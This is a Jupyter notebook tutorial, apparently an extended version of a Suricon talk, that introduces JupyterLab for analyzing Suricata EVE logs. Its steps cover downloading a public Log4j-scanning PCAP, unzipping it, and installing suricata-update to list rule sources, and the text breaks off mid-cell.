{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "eece3b24-7968-49b4-a9fe-db5a8a7135a4",
   "metadata": {},
   "source": [
    "# Jupyter Playbooks for Suricata\n",
    "\n",
    "Author: Markus Kont"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f8911b32-792d-4d38-bd8b-a7006f88c011",
   "metadata": {},
   "source": [
    "## Introduction\n",
    "\n",
    "Back in 2022, I did a Suricon presentation titled [Jupyter Playbooks for Suricata](https://youtu.be/hevTFubjlDQ). The goal of that presentation was to introduce JupyterLab to security practitioners who work with Suricata. Many people are familiar with exploring Suricata EVE output using established technology stacks such as Elastic stack, Splunk, etc. Yet might be unfamiliar with tools from data science world. Amazingly, a lot of people are still totally unfamiliar with EVE NSM data. It's 2023 and Suricata is still considered by many to be only a rule based IDS, even going so far that Suricata is often deployed in tandem with NSM logging tools as people believe Suricata is unable to fill the role.\n",
    "\n",
    "To amend the situation, the presentation was focused around use-cases around exploring Suricata EVE JSON logs. It attempted to bridge a gap between threat hunting and data analysis, communities that have large overlap in what they do, yet remain quite far separated. It also attempted to highlight useful insights that can be extracted from EVE NSM data.\n",
    "\n",
    "Original presentation resources can be found [here](https://github.com/StamusNetworks/suricata-analytics/blob/main/jupyter/Notebooks/Suricon2022Talk.ipynb). Since the presentation was about Jupyter notebooks, and Jupyter notebooks are by nature interactive, then it made no sense to me to format it as simple slideshow. In fact, notebook proved to be quite flexible presentation environment, and it turned the talk into one big tech demo. Perfect for a technical community conference. Input data was drawn from public sources, meaning anyone could run the notebook and repeat everything shown on stage.\n",
    "\n",
    "That notebook was meant to be used as a resource. One that anyone could access and use as a reference for analyzing Suricata EVE logs. However, as anyone familiar with doing presentations knows, the challenge is not creating content. It's fitting what you have into the time window. A 45 minute tech talk really does not leave enough time to properly explain important concepts, especially if the audience is unfamiliar with talking points. Many ides were cut, others were explained quickly to move forward to interesting sections. Each pseudo-slide also needed to be readable, meaning no extensive *walls of text* as they would simply not fit the screen. The fact is, what works in a technical writing does not work for presenting. And vice versa.\n",
    "\n",
    "Solution - write a extended notebook. More topics, more examples, and more context around each code cell. We will also section off the notebook into smaller blog posts for those not interested in interacting with notebook itself. Eventually it will formulate a series describing most important topics covered by the notebook. Why *most*? Because notebook can keep evolving over time, adding sections, improving examples, and maybe even reworking entire sections."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "30e8b346-9a81-4920-a0c0-3687757a5d3e",
   "metadata": {},
   "source": [
    "## About Jupyter notebooks\n",
    "\n",
    "[Project Jupyter](https://jupyter.org/), born out of IPython Notebooks project, promotes open standards for interactive computing. Jupyter notebook is built on IPython kernel for running computations on interactive code inputted by the user, and outputs the results of those computations. In addition to code and output, user can also write markdown text to document each step. Hence the *notebook* moniker. Quick code to feedback loop makes Jupyter notebooks perfect for experimentation and documentation. It has become the de'facto tool for data scientists for this very reason. *Kernels* for many languages are supported. For example, [R](https://www.r-project.org/), [NodeJS](https://nodejs.org/en/), [Julia](https://julialang.org/), [Go](https://go.dev/) and [many more](https://github.com/jupyter/jupyter/wiki/Jupyter-kernels)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d3c224c8-d277-45e9-848a-879e93c1c490",
   "metadata": {},
   "source": [
    "### Basic concepts\n",
    "\n",
    "A notebook is organized into *cells*. Those cells are generally executed from top to bottom, but can also be evaluated individually by the user. A cell can contain either `code` or `markdown`, but not both. "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c0746642-e589-4ff5-9ee5-dcbb1cf50636",
   "metadata": {},
   "source": [
    "#### Code Cells\n",
    "\n",
    "A code cell is similar to simple IDE, as it allows programmer to write code while also providing syntax highlighting and autocompletion. A code cell, unlike a typical script file, can be executed individually. In other words, cells *should* be evaluated sequentially but user is free to jump to earlier cell while retaining variables in memory that were created by latter cells. Whenever a code cell is executed, it displays return value of last line of code withing that cell. Simple variables can even be called with no additional printing or formatting code, as notebook automatically catches the return value. It even has built-in display formatting for data frames. More on that later."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9e390a25-82f7-4be1-94c5-b4e13d6988f5",
   "metadata": {},
   "source": [
    "#### Markdown Cells\n",
    "\n",
    "Markdown cells are simply for formatting text. Unlike code cells, they do not display the source and output separately. Active markdown cell displays raw markdown source for editing while executing those cells formats them for reading. User can easily toggle between editing and reading, unlike many other editors that only display the source and require generating a fully formatted document for reading."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0e7bbeff-6b3b-4627-8a75-9912fab3aa31",
   "metadata": {},
   "source": [
    "#### Kernel\n",
    "\n",
    "A *kernel* lies at the core of code evaluation loop. Jupyter itself is written in Python and [IPython](https://ipython.org/) is the default kernel it was built around. However, users can install any number of kernels for different languages. Those kernels can vary in maturity and quality. Don't be surprised when a kernel for your favorite language is missing basic features such as syntax highlighting or code suggestions. A custom kernel simply might not support those features yet. Some kernels might even be missing basic language features.\n",
    "\n",
    "Kernel is chosen when first creating a notebook and can not be changed later. Using multiple kernels in a single notebook is not currently possible. Nor is it possible to change a kernel of existing notebook."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3058c263-3518-4109-9f8a-e4fb0ca4b99e",
   "metadata": {},
   "source": [
    "#### JupyterLab\n",
    "\n",
    "*IPython notebook files* that use `.ipynb` file extension are generally considered to be the *Jupyter Notebooks*. However, the original web interface created for interacting with them is nowadays also often referred to as *jupyter notebook*. Reason is likely to distinguish that interface from [JupyterLab](https://jupyterlab.readthedocs.io/en/stable/getting_started/overview.html), an advanced interface with IDE-like features. Such as tabs, splits, variable exploration, extensions, and more. Old interface simply focused on interacting with a single notebook. A notebook *file* can be edited with both interfaces. There are no compatibility differences. JupyterLab simply provides a more extensive (but also more complex) interface.\n",
    "\n",
    "Lab instance can be launched with `jupyter lab` command while legacy interface can be executed with `jupyter notebook`. Nowadays most projects default to using lab over simple notebook editor, but many people might still prefer the simplicity of the old interface. Might be worth considering when only getting started."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "013020de-f3ad-4deb-956b-be8f30718af3",
   "metadata": {},
   "source": [
    "### Setup\n",
    "\n",
    "Jupyter core, lab IDE, and most extensions can simply be installed using normal python tooling. Keep in mind that `jupyter` and `jupyterlab` are separate packages with latter extending the former. They can be installed with any python package manager, such as pip, conda, mamba, etc.\n",
    "\n",
    "```\n",
    "pip install jupyter jupyterlab\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ff89c4c6-3231-40ea-af5c-b7c1cbd35d94",
   "metadata": {},
   "source": [
    "#### Local user install\n",
    "\n",
    "Global system install with `pip` is not recommended. I would suggest installing as regular user if not using a python virtual environment.\n",
    "\n",
    "```\n",
    "python3 -m pip install --user jupyter jupyterlab\n",
    "```\n",
    "\n",
    "Please keep in mind that this method shall place `jupyter` command into `~/.local/bin`. Don't be surprised when unable to find the jupyter command. Use full path or add this folder to PATH for convenience.\n",
    "\n",
    "```\n",
    "export PATH=\"$HOME/.local/bin:$PATH\"\n",
    "```\n",
    "\n",
    "```\n",
    "># which jupyter\n",
    "/home/user/.local/bin/jupyter\n",
    "```\n",
    "\n",
    "Once installed, simply run the jupyter command. Then mind the output.\n",
    "\n",
    "```\n",
    "(general) ➜  suricata-analytics-1 git:(next-suricon-2022-10-28) ✗ jupyter lab\n",
    "[I 2022-10-30 06:10:48.141 ServerApp] jupyterlab | extension was successfully linked.\n",
    "[I 2022-10-30 06:10:48.150 ServerApp] nbclassic | extension was successfully linked.\n",
    "[I 2022-10-30 06:10:48.170 LabApp] JupyterLab extension loaded from /home/markus/venvs/general/lib/python3.10/site-packages/jupyterlab\n",
    "[I 2022-10-30 06:10:48.170 LabApp] JupyterLab application directory is /home/markus/venvs/general/share/jupyter/lab\n",
    "[I 2022-10-30 06:10:48.173 ServerApp] jupyterlab | extension was successfully loaded.\n",
    "[I 2022-10-30 06:10:48.177 ServerApp] nbclassic | extension was successfully loaded.\n",
    "[I 2022-10-30 06:10:48.177 ServerApp] The port 8888 is already in use, trying another port.\n",
    "[I 2022-10-30 06:10:48.178 ServerApp] Serving notebooks from local directory: /home/markus/Projects/SN/suricata-analytics-1\n",
    "[I 2022-10-30 06:10:48.178 ServerApp] Jupyter Server 1.21.0 is running at:\n",
    "[I 2022-10-30 06:10:48.178 ServerApp] http://localhost:8889/lab?token=b675c4daec9a6c2beb11b0a6cd38a314509ae62b1989b2e2\n",
    "[I 2022-10-30 06:10:48.178 ServerApp]  or http://127.0.0.1:8889/lab?token=b675c4daec9a6c2beb11b0a6cd38a314509ae62b1989b2e2\n",
    "[I 2022-10-30 06:10:48.178 ServerApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).\n",
    "[C 2022-10-30 06:10:48.216 ServerApp]\n",
    "\n",
    "    To access the server, open this file in a browser:\n",
    "        file:///home/markus/.local/share/jupyter/runtime/jpserver-395207-open.html\n",
    "    Or copy and paste one of these URLs:\n",
    "        http://localhost:8889/lab?token=b675c4daec9a6c2beb11b0a6cd38a314509ae62b1989b2e2\n",
    "     or http://127.0.0.1:8889/lab?token=b675c4daec9a6c2beb11b0a6cd38a314509ae62b1989b2e2\n",
    "Opening in existing browser session.\n",
    "```\n",
    "\n",
    "Jupyter will by default launch the system default web browser. However, do pay special mind for the access information presented in this log output. Jupyter uses a randomly generated token to authenticate the session. This can of course be reconfigured in the configuration file to be a static token or even a password, but left unchanged requires following the connection link in order to properly authenticate. \n",
    "\n",
    "Do note also that example displays a port `8889` which is not the Jupyter default `8888`. Jupyter will detect if port is already in use, presumably by another instance of JupyterLab. When that happens, it simply increments the port number by one. Why would you want multiple instances of JupyterLab? Because you might want to use a different instances per project."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bdf77d1c-e25f-40a9-a702-120e89ae52cf",
   "metadata": {},
   "source": [
    "### Configuration\n",
    "\n",
    "Jupyter supports extensive configuration. By default, the configuration file is missing and default values are implicitly used. To customize the setup, user will need to generate it.\n",
    "\n",
    "```\n",
    "jupyter notebook --generate-config\n",
    "```\n",
    "\n",
    "Default configuration file will be placed under `~/.jupyter/jupyter_notebook_config.py`. Notice that it's actually a python code file rather than plaintext configuration. This can enable very nice extensions to configuration. For example, a user might want to read configuration from environment variables instead which is useful for creating docker containers.\n",
    "\n",
    "Customizing the configuration is not really needed for simple data exploration, however. Just something to keep in mind for advanced deployments."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9a4fc14d-8399-41aa-88d6-6805011b4afb",
   "metadata": {},
   "source": [
    "### Code example\n",
    "\n",
    "Jupyter is a interactive coding environment, so let's explore basic usage. Since the theme of this notebook is exploring EVE data, a good first exercise would be to download a PCAP file and parse it with Suricata. Results can then be analyzed in upcoming sections.\n",
    "\n",
    "A great resource for PCAP files is [Malware Traffic Analysis](https://malware-traffic-analysis.net/), a site maintained by Suricata community member that hosts PCAP files for various malware infection scenarios. We start with a simple one that contains web scanning and [Log4j](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance) CVE exploitation attempts. As any server administrator knows, website scanning is not really interesting traffic. It is inevitable when hosting any public services, scanning and exploitation attempts are fully automated by the malicious *spiders*. Think of it as malicious version of Google indexing your pages. All that can really be done against it is reducing the attack surface, keeping to best practices, and ensuring exposed services are fully up to date with latest patches. A exponentially more difficult task than those uninitiated would assume.\n",
    "\n",
    "Nevertheless, that noise means abundance of data, making the PCAP perfect for displaying what Jupyter can do. We need to understand the general nature of the raw data, then separate relevant events from the noise."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "63073d54-1900-4a53-8f15-bcf1037d58ca",
   "metadata": {},
   "outputs": [],
   "source": [
    "URL = \"https://malware-traffic-analysis.net/2022/01/03/2022-01-01-thru-03-server-activity-with-log4j-attempts.pcap.zip\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "30ec7a7f-0fa8-4d40-aef9-0ab454dd942e",
   "metadata": {},
   "source": [
    "Archive can be downloaded with HTTP GET request using python `requests` library. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "6b141288-d919-47ac-abb0-b7d0c77b25d1",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "response = requests.get(URL, stream=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "97a56f18-05c4-433a-acc3-27b1c9448190",
   "metadata": {},
   "source": [
    "Now we are able to conditionally check if download succeeded or not. If the response was HTTP 200 OK, then we stream the response payload into a local file handle. Along the way we also calculate some useful information, such as download size in kilobytes. If the response does not indicate a success, we simply report the failure. Note that failure reporting is done here mostly for demonstration. Most notebooks leave errors not handled, as subsequent code cells might depend on success on ones preceding it. Code evaluation is stopped when a cell *throws an exception*, prompting the user to figure out the issue. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "11768963-f0fc-4365-a6d7-72003bf40128",
   "metadata": {},
   "outputs": [],
   "source": [
    "OUTPUT = \"/tmp/malware-pcap.zip\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "856fefff-b968-43ad-8a92-f8ed88c87746",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Download good, writing 1254 KBytes to /tmp/malware-pcap.zip\n",
      "Done\n"
     ]
    }
   ],
   "source": [
    "if response.status_code == 200:\n",
    "    print(\"Download good, writing %d KBytes to %s\" % \n",
    "          (int(response.headers.get(\"Content-length\")) / 1024,\n",
    "           OUTPUT))\n",
    "    with open(OUTPUT, 'wb') as f:\n",
    "        f.write(response.raw.read())\n",
    "    print(\"Done\")\n",
    "else:\n",
    "    print(\"Demo effect has kicked in\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "82a62996-f44d-4e60-8b3e-be4750e9e533",
   "metadata": {},
   "source": [
    "Once downloaded, we can simply use native python libraries to unzip the file. Scripting this rather than unzipping manually has several perks. For instance, threat research file archives that could contain actual malware samples are conventionally password protected, in order to protect unsuspecting users from compromising themselves. Standard password for these archives is `infected`. We can simply script this common password into unpacking call to save time.\n",
    "\n",
    "Most difficult aspect about working with notebooks is dealing with data input and intermediate dumps. Reading a prepared CSV or JSON file is easy, but bundling it with notebook is not. Often I come back to a notebook that was made months ago, only to discover that it depends on data files that are no longer available. And nobody can remember any more how they were made. Or the notebook might point to hardcoded paths that only exist on analysts computer. It makes sense, since analyst wants to focus on the problem and not waste time dealing with how the data gets into the notebook. But that can make many notebooks unusable later.\n",
    "\n",
    "It's a tough challenge and a balancing act. It is okay to make rough notebooks that are discarded after use. Data exploration is a fluid discipline, so properly documenting initial shots into the dark is not often worth the effort. This notebook, however, is not meant for that. Packaging how the data gets into the notebook can be just as important as the analysis."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "713e6ee8-0b03-4c9d-9026-eeebfea2d5dc",
   "metadata": {},
   "outputs": [],
   "source": [
    "from zipfile import ZipFile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "17ff4ec4-c415-4625-ac6f-c199b0b9998b",
   "metadata": {},
   "outputs": [],
   "source": [
    "with ZipFile(OUTPUT, \"r\") as zip:\n",
    "    zip.extractall(path=\"/tmp\", pwd=\"infected\".encode(\"utf-8\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "91f8d68c-c9fd-4a2d-9112-82b83d58320c",
   "metadata": {},
   "source": [
    "Finally, we can verify that unpacked PCAP is in the filesystem by using *glob* search for finding all files with `.pcap` suffix. This allows us to build a variable that lists input files we can work with."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "9b43cf84-f869-4d24-a003-099de289852b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import glob"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "69048dc0-9445-466d-b75c-d26a9c9bddda",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/tmp/2022-01-01-thru-03-server-activity-with-log4j-attempts.pcap']"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "FILES = glob.glob(\"/tmp/*.pcap\")\n",
    "FILES"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0bcf7e8b-2074-4e9e-9c46-de9ccb04af9a",
   "metadata": {},
   "source": [
    "Note that we can simply display the value of `FILES` variable by calling it. No need for any `print` or string formatting statements, although those could make the output look nicer. Notebook calls builtin `display()` method for best effort output visualization. Method call is implicit when in global scope, meaning user does not need to import the method nor call it. But it would have to be called when displaying data from a function. Keep that in mind.\n",
    "\n",
    "Currently the output is a simple python list, so notebook displays it as such. No fancy formatting. However, we will soon see how data tables are automatically made nice looking. It could also be copy-pasted into code block or even into other scripts or programs. Jupyter can and often is used for generating code that would otherwise be too tedious to write by hand."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a6b50ff9-ab3a-435c-a6a7-32d63384325d",
   "metadata": {},
   "source": [
    "### Invoking a shell command\n",
    "\n",
    "Python code displayed in prior section is not complicated. But not even the most experienced programmers know every API by memory. Quite often we need to resort to scouring code documentation or internet forums to remind the most basic things. Writing custom code means handling things on fairly low level, even in *batteries included* language like Python. For a good reason. Using the `´requests` library expects user to have basic understanding about HTTP requests and responses, know how to access the response payload (should the request succeed), etc. The API does not and should not know anything about handling files on operating system level. That's a job for `os` package. You as the user have to know how to handle that.\n",
    "\n",
    "So, would it not be nice to simply call that basic `wget` command you know by heart and use all the time? You can!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "152456b1-c99a-4545-b046-6d58c3856ee6",
   "metadata": {},
   "outputs": [],
   "source": [
    "!wget -q -O /tmp/malware-pcap.zip.wget https://malware-traffic-analysis.net/2022/01/03/2022-01-01-thru-03-server-activity-with-log4j-attempts.pcap.zip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "d080181e-b18b-4914-8f88-54d957f33abc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rw-r--r-- 1 jovyan users 1.3M Feb  2 10:21 /tmp/malware-pcap.zip\n",
      "-rw-r--r-- 1 jovyan users 1.3M Jan  4  2022 /tmp/malware-pcap.zip.bashmagic\n",
      "-rw-r--r-- 1 jovyan users 1.3M Jan  4  2022 /tmp/malware-pcap.zip.wget\n"
     ]
    }
   ],
   "source": [
    "!ls -lah /tmp/malware-pcap*"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4aa93210-66bc-443b-b231-ccd1d0f6b3e8",
   "metadata": {},
   "source": [
    "Jupyter supports *magic* commands, either via built-in functions or calling shell commands. Exclamation mark as first symbol in the cell signifies a shell command. You can also use variables, though I imagine more complex logic will quickly become messy. Those magic commands are simply meant to be used for saving time on basics. Real power of a notebook still lies in all the options it gives the user for analyzing the data. And custom code enables that. Notebook users want to start analyzing data as fast as possible, so calling a familiar command instead of writing custom code can be a huge help."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "ae8b4483-d76a-4a26-80e3-0d99cb2dfc9e",
   "metadata": {},
   "outputs": [],
   "source": [
    "OUTPUT_BASH_MAGIC = OUTPUT + \".bashmagic\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "75a9f5ea-83e8-4aa9-a431-ae950b6a5a34",
   "metadata": {},
   "outputs": [],
   "source": [
    "!wget -q -O $OUTPUT_BASH_MAGIC $URL"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "168c47dd-127d-4e00-87d2-961b8a98836e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rw-r--r-- 1 jovyan users 1.3M Feb  2 10:21 /tmp/malware-pcap.zip\n",
      "-rw-r--r-- 1 jovyan users 1.3M Jan  4  2022 /tmp/malware-pcap.zip.bashmagic\n",
      "-rw-r--r-- 1 jovyan users 1.3M Jan  4  2022 /tmp/malware-pcap.zip.wget\n"
     ]
    }
   ],
   "source": [
    "!ls -lah /tmp/malware-pcap*"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "311aee98-5249-42fa-a18a-c4b5417daae0",
   "metadata": {},
   "source": [
    "#### Updating Suricata rules\n",
    "\n",
    "Starting the code cell with percentage sign `%` invokes built-in functions. Again, it is a method for saving time on basic tasks. Jupyter has commands for loading python file content into a code cell, measuring execution time, installing python dependencies etc. Dependency install is especially useful in this notebook.\n",
    "\n",
    "Working with Suricata eventually requires downloading and customizing rule files. Initial ruleset setup is quite easy, but maintaining it daily is a lot more difficult. Not every signature is meant to provide useful info in every environment. Alerting on a UNIX ping on a secure subnet that should only have Windows devices can be a red flag, but the same rule on a typical Linux server subnet is just a source of noise. A Linux system administrator would likely want to disable that rule, and ensure it remains disabled when ruleset is updated the next day. For a long time, this was out of scope for the main project and people had to resort to using legacy tools or custom scripts for downloading, updating, or modifying their rulesets.\n",
    "\n",
    "[Suricata Update](https://suricata-update.readthedocs.io/en/latest/) is a command-line rule management tool developed and maintained by OISF. It comes bundled with Suricata, assuming it's built with all python tooling correctly enabled. But it can very easily installed individually, as just like Jupyter, it too is written in python. Jupyter builtin `%pip` command turns out to be very useful here, as we can ensure it's installed with minimal effort. Directly from the notebook. Makes it pretty handy for ensuring that notebook uses correct ruleset, without actually bundling the rules with notebook itself. File paths and software licenses can be a pain to deal with."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "66926f1f-da15-4678-880c-9de787d310b5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: suricata-update in /home/jovyan/.local/lib/python3.10/site-packages (1.2.6)\n",
      "Requirement already satisfied: pyyaml in /opt/conda/lib/python3.10/site-packages (from suricata-update) (6.0)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "%pip install suricata-update"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "77ab267c-796b-4125-a104-fd2d9fda8ba8",
   "metadata": {},
   "source": [
    "Once suricata-update is installed, we can use it to enable rule sources, apply rule modification or disable overrides, and update our ruleset itself. For now, we simply enable a hunting ruleset that's likely to be too verbose on normal production installation. But it can highlight useful events that might go unnoticed with core Emerging Threats Open. For demonstration, the following cells:\n",
    "\n",
    "* list available public sources to see what can be enabled;\n",
    "* enable a new ruleset that's already defined in default public rule sources;\n",
    "* call suricata-update itself to actually update the rule file;\n",
    "\n",
    "Once called, `suricata-udpate` will download tarballs from each enabled source, apply conversion rules as needed, then concatenate the result into a single output rule file. If a rule file was downloaded recently, it might skipe the download entirely as normally this is done at most once a day."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "77cb50f8-b97d-47de-9099-cfabc2bc9015",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Using data-directory /var/lib/suricata.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Using Suricata configuration /etc/suricata/suricata.yaml\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Using /opt/suricata/share/suricata/rules for Suricata provided rules.\u001b[0m\n",
      "\u001b[32m2/2/2023 -- 10:22:14\u001b[0m - <\u001b[33mInfo\u001b[0m> -- Found Suricata version 7.0.0-beta1 at /opt/suricata/bin/suricata.\u001b[0m\n",
      "\u001b[1;36mName\u001b[0m: \u001b[1;35met/open\u001b[0m\n",
      "  \u001b[1;36mVendor\u001b[0m: \u001b[1;35mProofpoint\u001b[0m\n",
      "  \u001b[1;36mSummary\u001b[0m: \u001b[1;35mEmerging Threats Open Ruleset\u001b[0m\n",
      "  \u001b[1;36mLicense\u001b[0m: \u001b[1;35mMIT\u001b[0m\n",
      "\u001b[1;36mName\u001b[0m: \u001b[1;35met/pro\u001b[0m\n",
      "  \u001b[1;36mVendor\u001b[0m: \u001b[1;35mProofpoint\u001b[0m\n",
      "  \u001b[1;36mSummary\u001b[0m: \u001b[1;35mEmerging Threats Pro Ruleset\u001b[0m\n",
      "  \u001b[1;36mLicense\u001b[0m: \u001b[1;35mCommercial\u001b[0m\n",
      "  \u001b[1;36mReplaces\u001b[0m: \u001b[1;35met/open\u001b[0m\n",
      "  \u001b[1;36mParameters\u001b[0m: \u001b[1;35msecret-code\u001b[0m\n",
      "  \u001b[1;36mSubscription\u001b[0m: \u001b[1;35mhttps://www.proofpoint.com/us/threat-insight/et-pro-ruleset\u001b[0m\n",
      "\u001b[1;36mName\u001b[0m: \u001b[1;35moisf/trafficid\u001b[0m\n",
      "  \u001b[1;36mVendor\u001b[0m: \u001b[1;35mOISF\u001b[0m\n",
      "  \u001b[1;36mSummary\u001b[0m: \u001b[1;35mSuricata Traffic ID ruleset\u001b[0m\n",
      "  \u001b[1;36mLicense\u001b[0m: \u001b[1;35mMIT\u001b[0m\n",
      "\u001b[1;36mName\u001b[0m: \u001b[1;35mscwx/enhanced\u001b[0m\n",
      "  \u001b[1;36mVendor\u001b[0m: \u001b[1;35mSecureworks\u001b[0m\n",
      "  \u001b[1;36mSummary\u001b[0m: \u001b[1;35mSecureworks suricata-enhanced ruleset\u001b[0m\n",
      "  \u001b[1;36mLicense\u001b[0m: \u001b[1;35mCommercial\u001b[0m\n",
      "  \u001b[1;36mParameters\u001b[0m: \u001b[1;35msecret-code\u001b[0m\n",
      "  \u001b[1;36mSubscription\u001b[0m: \u001b[1;35mhttps://www.secureworks.com/contact/ (Please reference CTU Countermeasures)\u001b[0m\n",
      "\u001b[1;36mName\u001b[0m: \u001b[1;35mscwx/malware\u001b[0m\n",
      "  \u001b[1;36mVendor\u001b[0m: \u001b[1;35mSecureworks\u001b[0m\n",
      "  \u001b[1;36mSummary\u001b[0m: \u001b[1;35mSecureworks suricata-malware ruleset\u001b[0m\n",
      "  \u001b[1;36mLicense\u001b[0m: \u001b[1;35mCommercial\u001b[0m\n",
      "  \u001b[1;36mParameters\u001b[0m: \u001b[1;35msecret-code\u001b[0m\n",
      "  \u001b[1;36mSubscription\u001b[0m: \u001b[1;35mhttps://www.secureworks.com/contact/ (Please reference CTU Countermeasures)\u001b[0m\n",
      "\u001b[1;36mName\u001b[0m: \u001b[1;35mscwx/security\u001b[0m\n",
      "  \u001b[1;36mVendor\u001b[0m: \u001b[1;35mSecureworks\u001b[0m\n",
      "  \u001b[1;36mSummary\u001b[0m: \u001b[1;35mSecureworks suricata-security ruleset\u001b[0m\n",
      "  \u001b[1;36mLicense\u001b[0m: \u001b[1;35mCommercial\u001b[0m\n",
      "  \u001b[1;36mParameters\u001b[0m: \u001b[1;35msecret-code\u001b[0m\n",
      "  \u001b[1;36mSubscription\u001b[0m: \u001b[1;35mhttps://www.secureworks.com/contact/ (Please reference CTU Countermeasures)\u001b[0m\n",
      "\u001b[1;36mName\u001b[0m: \u001b[1;35msslbl/ssl-fp-blacklist\u001b[0m\n",
      "  \u001b[1;36mVendor\u001b[0m: \u001b[1;35mAbuse.ch\u001b[0m\n",
      "  \u001b[1;36mSummary\u001b[0m: \u001b[1;35mAbuse.ch SSL Blacklist\u001b[0m\n",
      "  \u001b[1;36mLicense\u001b[0m: \u001b[1;35mNon-Commercial\u001b[0m\n",
      "\u001b[1;36mName\u001b[0m: \u001b[1;35msslbl/ja3-fingerprints\u001b[0m\n",
      "  \u001b[1;36mVendor\u001b[0m: \u001b[1;35mAbuse.ch\u001b[0m\n",
      "  \u001b[1;36mSummary\u001b[0m: \u001b[1;35mAbuse.ch Suricata JA3 Fingerprint Ruleset\u001b[0m\n",
      "  \u001b[1;36mLicense\u001b[0m: \u001b[1;35mNon-Commercial\u001b[0m\n",
      "\u001b[1;36mName\u001b[0m: \u001b[1;35metnetera/aggressive\u001b[0m\n",
      "  \u001b[1;36mVendor\u001b[0m: \u001b[1;35mEtnetera a.s.\u001b[0m\n",
      "  \u001b[1;36mSummary\u001b[0m: \u001b[1;35mEtnetera aggressive IP blacklist\u001b[0m\n",
      "  \u001b[1;36mLicense\u001b[0m: \u001b[1;35mMIT\u001b[0m\n",
      "\u001b[1;36mName\u001b[0m: \u001b[1;35mtgreen/hunting\u001b[0m\n",
      "  \u001b[1;36mVendor\u001b[0m: \u001b[1;35mtgreen\u001b[0m\n",
      "  \u001b[1;36mSummary\u001b[0m: \u001b[1;35mThreat hunting rules\u001b[0m\n",
      "  \u001b[1;36mLicense\u001b[0m: \u001b[1;35mGPLv3\u001b[0m\n",
      "\u001b[1;36mName\u001b[0m: \u001b[1;35mmalsilo/win-malware\u001b[0m\n",
      "  \u001b[1;36mVendor\u001b[0m: \u001b[1;35mmalsilo\u001b[0m\n",
      "  \u001b[1;36mSummary\u001b[0m: \u001b[1;35mCommodity malware rules\u001b[0m\n",
      "  \u001b[1;36mLicense\u001b[0m: \u001b[1;35mMIT\u001b[0m\n",
      "\u001b[1;36mName\u001b[0m: \u001b[1;35mstamus/lateral\u001b[0m\n",
      "  \u001b[1;36mVendor\u001b[0m: \u001b[1;35mStamus Networks\u001b[0m\n",
      "  \u001b[1;36mSummary\u001b[0m: \u001b[1;35mLateral movement rules\u001b[0m\n",
      "  \u001b[1;36mLicense\u001b[0m: \u001b[1;35mGPL-3.0-only\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!/home/jovyan/.local/bin/suricata-update list-sources"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "8d1155b9-7031-4e41-ba78-c91f809a8e14",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
